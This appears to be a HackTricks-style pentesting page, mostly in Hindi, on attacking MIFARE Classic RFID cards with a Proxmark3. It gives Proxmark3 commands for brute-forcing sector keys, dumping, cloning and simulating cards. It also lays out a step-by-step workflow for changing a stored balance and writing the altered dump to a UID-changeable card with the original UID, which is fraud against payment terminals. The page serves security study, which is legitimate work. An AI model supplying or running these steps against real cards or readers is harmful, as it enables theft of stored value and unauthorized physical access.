# Proxmark 3

{{#include ../../banners/hacktricks-training.md}}

## Proxmark3 के साथ RFID Systems पर हमला

The first thing you need to do is to have a [**Proxmark3**](https://proxmark.com) and [**install the software and it's dependencie**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux)[**s**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux).

### MIFARE Classic 1KB पर हमला

इसमें **16 sectors** हैं, प्रत्येक में **4 blocks** हैं और प्रत्येक block में **16B** होते हैं। UID sector 0 block 0 में है (और बदला नहीं जा सकता).\
प्रत्येक sector में पहुँचने के लिये आपको **2 keys** (**A** और **B**) चाहिए जो **block 3 of each sector** (sector trailer) में स्टोर रहती हैं। sector trailer में वही **access bits** भी स्टोर रहते हैं जो 2 keys का उपयोग करके **each block** पर **read and write** permissions देते हैं।\
2 keys इस तरह उपयोगी होते हैं कि अगर आप पहले key को जानते हैं तो read की अनुमति मिल सकती है और दूसरे को जानते हैं तो write (उदाहरण के लिये)।

कई प्रकार के attacks किए जा सकते हैं
```bash
proxmark3> hf mf #List attacks

proxmark3> hf mf chk *1 ? t ./client/default_keys.dic #Keys bruteforce
proxmark3> hf mf fchk 1 t # Improved keys BF

proxmark3> hf mf rdbl 0 A FFFFFFFFFFFF # Read block 0 with the key
proxmark3> hf mf rdsc 0 A FFFFFFFFFFFF # Read sector 0 with the key

proxmark3> hf mf dump 1 # Dump the information of the card (using creds inside dumpkeys.bin)
proxmark3> hf mf restore # Copy data to a new card
proxmark3> hf mf eload hf-mf-B46F6F79-data # Simulate card using dump
proxmark3> hf mf sim *1 u 8c61b5b4 # Simulate card using memory

proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to block 1
proxmark3> hf mf eget 01 # Read block 1
proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
```
The Proxmark3 अन्य क्रियाएँ भी करने की अनुमति देता है, जैसे संवेदनशील डेटा खोजने की कोशिश के लिए **eavesdropping** करना — एक **Tag to Reader communication**। इस कार्ड में आप संचार को बस sniff कर सकते हैं और प्रयुक्त कुंजी की गणना कर सकते हैं क्योंकि **cryptographic operations used are weak** और plain और cipher text जानने पर आप इसे (`mfkey64` tool) से निकाल सकते हैं।

#### MiFare Classic के लिए stored-value दुरुपयोग का त्वरित वर्कफ़्लो

जब टर्मिनल Classic कार्ड्स पर बैलेंस स्टोर करते हैं, तो एक सामान्य end-to-end फ्लो इस प्रकार होता है:
```bash
# 1) Recover sector keys and dump full card
proxmark3> hf mf autopwn

# 2) Modify dump offline (adjust balance + integrity bytes)
#    Use diffing of before/after top-up dumps to locate fields

# 3) Write modified dump to a UID-changeable ("Chinese magic") tag
proxmark3> hf mf cload -f modified.bin

# 4) Clone original UID so readers recognize the card
proxmark3> hf mf csetuid -u <original_uid>
```
नोट्स

- `hf mf autopwn` nested/darkside/HardNested-style हमलों का संचालन करता है, keys पुनः प्राप्त करता है, और client dumps फ़ोल्डर में dumps बनाता है।
- ब्लॉक 0/UID लिखना केवल magic gen1a/gen2 cards पर ही काम करता है। सामान्य Classic cards का UID read-only होता है।
- कई तैनातीयों में Classic "value blocks" या साधारण checksums का उपयोग होता है। संपादन के बाद सुनिश्चित करें कि सभी duplicated/complemented fields और checksums सुसंगत हों।

See a higher-level methodology and mitigations in:

{{#ref}}
pentesting-rfid.md
{{#endref}}

### रॉ कमांड्स

IoT सिस्टम कभी-कभी **nonbranded या noncommercial tags** का उपयोग करते हैं। इस स्थिति में, आप Proxmark3 का उपयोग करके tags को कस्टम **raw commands भेज सकते हैं**।
```bash
proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
SAK : 08 [2]
TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1
proprietary non iso14443-4 card found, RATS not supported
No chinese magic backdoor command detected
Prng detection: WEAK
Valid ISO14443A Tag Found - Quiting Search
```
इस जानकारी के साथ आप कार्ड और उससे संवाद करने के तरीके के बारे में जानकारी खोजने की कोशिश कर सकते हैं। Proxmark3 आपको raw कमांड भेजने की अनुमति देता है जैसे: `hf 14a raw -p -b 7 26`

### Scripts

Proxmark3 सॉफ़्टवेयर में पहले से लोड की गई **automation scripts** की एक सूची आती है जिसे आप सरल कार्यों को निष्पादित करने के लिए उपयोग कर सकते हैं। पूरी सूची प्राप्त करने के लिए `script list` कमांड का उपयोग करें। फिर, `script run` कमांड का उपयोग करें, उसके बाद स्क्रिप्ट का नाम लिखें:
```
proxmark3> script run mfkeys
```
आप एक स्क्रिप्ट बना सकते हैं ताकि **fuzz tag readers**, इसलिए किसी **valid card** के डेटा की कॉपी लेकर बस एक **Lua script** लिखें जो एक या अधिक **bytes** को **randomize** करे और जांचे कि किसी भी iteration में **reader crashes** होता है या नहीं।

## संदर्भ

- [Proxmark3 wiki: HF MIFARE](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Mifare)
- [Proxmark3 wiki: HF Magic cards](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Magic-cards)
- [NXP statement on MIFARE Classic Crypto1](https://www.mifare.net/en/products/chip-card-ics/mifare-classic/security-statement-on-crypto1-implementations/)
- [NFC card vulnerability exploitation in KioSoft Stored Value (SEC Consult)](https://sec-consult.com/vulnerability-lab/advisory/nfc-card-vulnerability-exploitation-leading-to-free-top-up-kiosoft-payment-solution/)

{{#include ../../banners/hacktricks-training.md}}
